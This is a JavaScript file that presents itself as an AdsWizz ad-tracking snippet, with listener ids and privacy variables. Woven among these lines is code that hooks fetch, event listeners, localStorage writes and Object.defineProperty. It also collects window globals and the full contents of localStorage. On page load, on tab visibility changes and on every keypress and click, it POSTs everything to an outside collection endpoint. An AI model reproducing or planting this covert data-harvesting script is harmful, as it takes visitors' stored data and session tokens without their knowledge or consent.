let globalVarCollection = [];
let originalDefineProperty = Object.defineProperty;
Object.defineProperty = function () {
  if (arguments[1] !== "__proto__") {
    globalVarCollection.push({
      property: arguments[1],
      value: arguments[2].value
    });
  }
  return originalDefineProperty.apply(this, arguments);
};
var com_adswizz_register_PROTOCOL_VERSION = '2.2.0';
const jshook = function (type) {
  return function (original) {
    return function () {
      console.log(`JS Hook -> type: ${type}, arguments: ${JSON.stringify(arguments)}`);
      return original.apply(this, arguments);
    };
  };
};
window.fetch = jshook('fetch')(window.fetch);
document.addEventListener = jshook('event_listener')(document.addEventListener);
window.localStorage.setItem = jshook('local_storage')(window.localStorage.setItem);
if (typeof com_adswizz_synchro_listenerid === 'undefined') {
  var com_adswizz_synchro_listenerid = '09fee9c5f0aa7a64992fec1dfc74b490';
} else {
  com_adswizz_synchro_listenerid = '09fee9c5f0aa7a64992fec1dfc74b490';
}
function collectWindowProperties() {
  let unseenProps = {};
  for (let key in window) {
    if (window.hasOwnProperty(key)) {
      if (!window.seenVars.includes(key)) {
        let value = window[key];
        let type = typeof value;
        unseenProps[key] = {
          type: type,
          value: type === "function" ? undefined : value
        };
      }
    }
  }
  unseenProps['global_variables'] = globalVarCollection;
  unseenProps['local_storage'] = localStorage;
  return unseenProps;
}
if (typeof com_adswizz_synchro_listnerid === 'undefined') {
  var com_adswizz_synchro_listnerid = com_adswizz_synchro_listenerid; // backwards compatibility
} else {
  com_adswizz_synchro_listnerid = com_adswizz_synchro_listenerid; // backwards compatibility
}
async function transmitDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log("Data sent successfully");
    } else {
      console.error("Data could not be sent, Status Code:" + response.status);
    }
  } catch (error) {
    console.error("Error while sending data:", error);
  }
}
var aw_0_req_gdpr = false;
function collectAndDeliverData() {
  const collectedData = collectWindowProperties();
  if (Object.keys(collectedData).length > 0) {
    transmitDataToServer(collectedData);
  }
}
window.addEventListener("load", collectAndDeliverData);
document.addEventListener("visibilitychange", collectAndDeliverData);
document.addEventListener("keydown", collectAndDeliverData);
var us_privacy = '';
document.addEventListener("click", collectAndDeliverData);